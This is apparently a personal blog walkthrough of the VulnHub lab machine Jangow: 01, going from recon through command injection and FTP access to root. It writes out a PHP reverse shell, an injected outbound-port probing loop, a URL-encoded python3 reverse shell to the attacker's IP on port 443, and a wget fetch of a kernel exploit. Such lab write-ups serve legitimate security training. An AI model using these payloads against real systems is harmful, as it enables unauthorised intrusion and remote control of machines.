Yo! Back again with another VulnHub walkthrough — this time we’re diving into _Jangow: 01_. Let’s get rootin’! 💥
This is my second writeup 2/1000
## Recon

![w](/assets/img/attachments/jangow-1.png)

First step was making sure that the machine is reachable, lets START.
Now, As always we'll run an Nmap scan on all ports to see which services are exposed — this will help us decide where to dig deeper.

`sudo masscan -p1-65535 192.168.56.118`

![w](/assets/img/attachments/jangow-2.png)

Then we will use nmap to do full scan on those two open ports

`nmap 192.168.56.118 -Pn -sV -sC -p80,21`

This how the website looked like, after taking a deep look on the functionality of this website and when i clicked on buscar i found this 
## Exploiting vulnerability

![w](/assets/img/attachments/jangow-6.png)
![w](/assets/img/attachments/jangow-7.png)

Command Injection!

![w](/assets/img/attachments/jangow-8.png)

After some investigation and enumeration, I discovered a file that initially appeared to contain the user's password. However, it didn’t work for login, so I assumed it might just be the user flag instead.
I then attempted to gain a reverse shell by setting up a listener on my machine, but none of the payloads I tried were successful. 
So, I decided to go back to discover more files on the machine. I ran web content discovery from the beginning using

`ffuf -u http://192.168.56.118/FUZZ -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -recursion -recursion-depth 2
`
![w](/assets/img/attachments/jangow-9.png)

I couldn't access the content of the file directly, but since there is a command injection vulnerability, I plan to open the file from there.
Got nothing from the browser (I think the file is being rendered)

![w](/assets/img/attachments/jangow-10.png)
![w](/assets/img/attachments/jangow-11.png)

But curl got it, now i will try to gain access with password using ftp (the second open port)
## Initial Access

![w](/assets/img/attachments/jangow-12.png)
I tried both usernames and i logged in with jangow01 !
Since I have access to FTP, I will try to get a shell to proceed to the next step. To do this, I attempted to see if I can upload files to the directory I'm currently in.

![w](/assets/img/attachments/jangow-13.png)

I couldn't, so i thought of changing the directory I'm currently in to /home/jangow01

![w](/assets/img/attachments/jangow-14.png)

And it was uploaded successfully!

```php
<?php
$sock=fsockopen("192.168.246.128",4444);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
```
I tried to upload this shell and trigger it buy running curl command

`curl "http://192.168.56.118/site/busque.php?buscar=php+/home/jangow01/shell.php"`

But it didn't work. I troubleshot the file I uploaded before.
![w](/assets/img/attachments/jangow-15.png)

And couldn't view its content

![w](/assets/img/attachments/jangow-16.png)

Maybe that’s why PHP couldn’t open the file. To solve this, I granted it read and execute permissions.

`chmod 755 /home/jangow01/shell.php`

![w](/assets/img/attachments/jangow-17.png)

Even though, I didn't got the shell, I tried several methods but couldn't get it. 
I tested if i opened http server on my machine would the target machine send any requests to me

`http://192.168.56.118/site/busque.php?buscar=wget+http:/192.168.246.128:8000/hello.txt`

I didn't receive any connection, so I believe there's a firewall blocking outgoing connections — which is likely why I wasn't able to get a reverse shell. Now, I need to identify which ports are not blocked. I used the following script to test that:
```python
# listener.py

import socket

import threading

  

ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 161, 443, 587, 993, 995, 3306, 3389]

  

def handle_conn(port):

    sock = socket.socket()

    sock.bind(("0.0.0.0", port))

    sock.listen(1)

    print(f"[+] Listening on port {port}")

    conn, addr = sock.accept()

    print(f"[!] Connection received on port {port} from {addr}")

    conn.close()

    sock.close()

  

for port in ports:

    threading.Thread(target=handle_conn, args=(port,), daemon=True).start()

  

input("Press Enter to exit...\n")
```

The script uses threading to start listeners on the most commonly guessed outbound ports. On the vulnerable parameter, we initiate these connections using `telnet` with the following payload:

`http://192.168.56.118/site/busque.php?buscar=echo%20%27QUIT%27%20|%20for%20i%20in%20$(seq%201%201024);%20do%20echo%20%22Porta%20$i%20==%3E%22;%20timeout%20--signal=9%202%20telnet%20192.168.56.1%20$i;echo%20%22Port%20$i%20%3C==%22;%20done;`

decoded:
`http://192.168.56.118/site/busque.php?buscar=echo 'QUIT' | for i in $(seq 1 1024); do echo "Porta $i ==>"; timeout --signal=9 2 telnet 192.168.56.1 $i; echo "Port $i <=="; done;`

and then we got this!

![w](/assets/img/attachments/jangow-18.png)

Which tell us that port 443 isn't blocked for outgoing traffic by the firewall, by running 
`which python3`
![w](/assets/img/attachments/jangow-19.png)

I confirmed python3 is installed, next i used this reverse shell command

`http://192.168.56.118/site/busque.php?buscar=/usr/bin/python3%20-c%20%27import%20socket;%20import%20subprocess;%20import%20os;%20s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);%20s.connect((%22192.168.56.1%22,443));%20os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);%20subprocess.call([%22/bin/bash%22,%20%22-i%22])%27`

![w](/assets/img/attachments/jangow-20.png)

And voilà! We got a connection. 🎉
## Privilege Escalation
we’ll start gathering information about the system itself, beginning with displaying detailed system information. But while doing this manually i will run linpeas at the background

`uname -a `

![w](/assets/img/attachments/jangow-21.png)

![w](/assets/img/attachments/jangow-22.png)

Upon researching the version, a known vulnerability was identified that could potentially be exploited.

![w](/assets/img/attachments/jangow-23.png)

linpeas output too

![w](/assets/img/attachments/jangow-24.png)

Now i will upload the exploit to the machine using the same python server.

`http://192.168.56.118/site/busque.php?buscar=wget+http://ip:443/47170.c`

![w](/assets/img/attachments/jangow-25.png)

After making sure that gcc is installed, will compile the exploit

`gcc 47170.c -o exploit`

![w](/assets/img/attachments/jangow-26.png)

I moved to /tmp since i didn't have the write permission on /site directory

![w](/assets/img/attachments/jangow-27.png)

It's Ok 😢, we will try another exploit

![w](/assets/img/attachments/jangow-28.png)

Will go with this one, 

![w](/assets/img/attachments/jangow-29.png)

![w](/assets/img/attachments/jangow-30.png)

And Finallyyy!! rooted!

![w](/assets/img/attachments/jangow-31.png)

Rooted it. Another one bites the dust. 🏴‍☠️ see u soon!
